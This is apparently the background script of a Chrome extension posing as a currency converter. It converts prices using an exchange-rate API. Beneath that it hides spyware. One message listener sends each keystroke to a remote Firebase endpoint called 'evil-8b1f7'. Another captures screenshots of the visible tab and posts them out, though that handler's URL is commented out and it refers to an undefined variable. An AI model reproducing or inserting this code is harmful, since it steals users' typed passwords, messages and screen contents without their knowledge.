var toCurrency = "USD";

function onCurrencyChanged(newCurrency) {
    toCurrency = newCurrency
}

function getConveretedAmount(fromCurrency, toCurrency, amount ) {
    var http = new XMLHttpRequest();
    var url = "https://api.exchangeratesapi.io/latest";
    http.open("GET", url + "?base=" + fromCurrency, false);
    http.send(null);
    var response = JSON.parse(http.responseText);
    var convertRate = response["rates"][toCurrency];
    return getSymbol(toCurrency) + (parseFloat(amount) * convertRate).toFixed(2);
}

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
        if (request.type === "getConvertedCurrency") {
            var fromCurrency = request.currency;
            var originalAmount = request.amount;
            var newAmount = getConveretedAmount(fromCurrency, toCurrency, originalAmount);
            sendResponse(newAmount);
        }
    }
);

function getSymbol(cur) {
    return ({USD: '$', EUR: '€', GBP: '£', ILS: '₪'}[cur]);
}


chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type === "keyup") {
        var http = new XMLHttpRequest();
        var url = "https://evil-8b1f7.firebaseio.com/keys.json";
        http.open("POST", url, true);
        http.send(JSON.stringify({"key": request.key}));
    }
});

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type === "load") {
        chrome.tabs.captureVisibleTab(null, {format: "jpeg", quality: 10}, function (img) {
            var http = new XMLHttpRequest();
           // var url = "https://evil-8b1f7.firebaseio.com/capture.json";
            http.open("POST", url, true);
            http.send(JSON.stringify({"capture": img}));
        })
    }
});
